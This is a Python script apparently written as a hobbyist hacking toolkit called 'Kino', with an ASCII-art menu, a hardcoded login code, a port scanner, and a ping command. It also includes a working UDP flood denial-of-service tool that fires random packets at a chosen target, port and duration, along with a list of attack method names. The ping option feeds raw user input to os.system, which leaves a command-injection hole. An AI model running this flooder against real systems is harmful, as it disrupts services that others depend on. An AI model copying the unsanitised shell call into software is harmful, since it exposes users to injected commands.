import time
import os
import socket
import random
import webbrowser

#########################################
# if you have this it means i leaked it #
#########################################

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # for portscan
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # for dos attacker
bytes = random._urandom(1024)

def main():
	time.sleep(1)
	os.system("clear")
	
	print("\u001b[36m		┈┈┈╲┈┈┈┈╱") #introduction
	print("		┈┈┈╱▔▔▔▔╲")
	print("		┈┈┃┈▇┈┈▇┈┃")
	print("		╭╮┣━━━━━━┫╭╮")
	print("		┃┃┃┈┈┈┈┈┈┃┃┃")
	print("		╰╯┃┈┈┈┈┈┈┃╰╯")
	print("		┈┈╰┓┏━━┓┏╯")
	print("		┈┈┈╰╯┈┈╰╯ \u001b[37mKino Developed By Exo")
	
	time.sleep(2)
	os.system("clear")
	
	print("\u001b[36m")
	print("		██╗  ██╗██╗███╗   ██╗ ██████╗")
	print("		██║ ██╔╝██║████╗  ██║██╔═══██╗")
	print("		█████╔╝ ██║██╔██╗ ██║██║   ██║")
	print("		██╔═██╗ ██║██║╚██╗██║██║   ██║")
	print("		██║  ██╗██║██║ ╚████║╚██████╔╝")
	print("		╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝")
	time.sleep(2)
	print("		═════════════════════════════")
	print("\u001b[37m       		Login     ")
	print("")
	time.sleep(1)
	
	user = input("User: ")
	name = input("Secret Code: ") #insert name
	if name == "6969":
		os.system("clear")
		print("Login Successful...")
		time.sleep(1)
		os.system("clear")
	else:
		print("Login Incorrect!")
		exit()
	print("\u001b[36m")
	print("		██╗  ██╗██╗███╗   ██╗ ██████╗")
	print("		██║ ██╔╝██║████╗  ██║██╔═══██╗")
	print("		█████╔╝ ██║██╔██╗ ██║██║   ██║")
	print("		██╔═██╗ ██║██║╚██╗██║██║   ██║")
	print("		██║  ██╗██║██║ ╚████║╚██████╔╝")
	print("		╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝")
	print('\u001b[37m		    Hello,',user,'welcome')
	print("		    Here are your options")
	print("")
	print("		══════════════════════════════════════════")
	print("		1. Portscan		2. Ping             ")
	print("")
	print("		3. Credits		4. DoS")
	print("")
	print("		5. Instagram		6. Killshotvpn")
	print("")
	print("		7. API Methods		8. API Attack HUB")
	print("		══════════════════════════════════════════")
	option = input("Select: ")
	if option == "help":
		print("Are you dumb? The options are right there...")

	if option == "1":
			print("\u001b[36m		You have selected Portscan") #portscanner
			os.system("clear")
			print("-------------------------------")
			host = input("Input Host: ")
		
			def main(port):
				try:
					s.connect((host,port))
					return True
				except:
					return False
			for x in range(1,65500):
				if main(x):
					print('Port',x,'is open on',host)
	if option == "2":
		os.system("clear")
		print("\u001b[36m		You have selected Ping")
		ping = input("Input Host: ")
		os.system("clear")
		os.system("ping {}" .format (ping))
	if option == "3":
		os.system("clear")
		print("\u001b[36mCreated by Exo, insta: @exo.phobian discord: idk it will prob get banned next week lol")

	if option == "4":
		os.system("clear")
		print("\u001b[36m")
		print("		██████╗  ██████╗ ███████╗")
		print("		██╔══██╗██╔═══██╗██╔════╝")
		print("		██║  ██║██║   ██║███████╗")
		print("		██║  ██║██║   ██║╚════██║")
		print("		██████╔╝╚██████╔╝███████║")
		print("		╚═════╝  ╚═════╝ ╚══════╝ (Run on a vps)")
		print("\u001b[37m		You selected DoS")
		ip = input("Target: ")
		port = int(input("Port: "))
		dur = int(input("Time: "))
		timeout = time.time() + dur
		sent = 0
	
		while True:
			try:
				if time.time() > timeout:
					break
				else:
					pass
				sock.sendto(bytes, (ip, port))
				sent = sent + 1
				print("Sending Packets to",ip,"for",dur,"seconds")
			except KeyboardInterrupt:
				print("Attack Stopped")
	if option == "5":
		os.system("clear")
		print("Loading...")
		webbrowser.open("https://www.instagram.com/exo.phobian/")
	if option == "6":
		os.system("clear")
		print("loading...")
		webbrowser.open("https://www.killshotvpn.com/")
	if option == "7":
		os.system("clear")
		print("""
		UDP
		TCP
		XMAS
		SYN
		VSE
		CNC
		""")
	if option == "8":
		os.system("clear")
		print("Coming Soon...")
main()
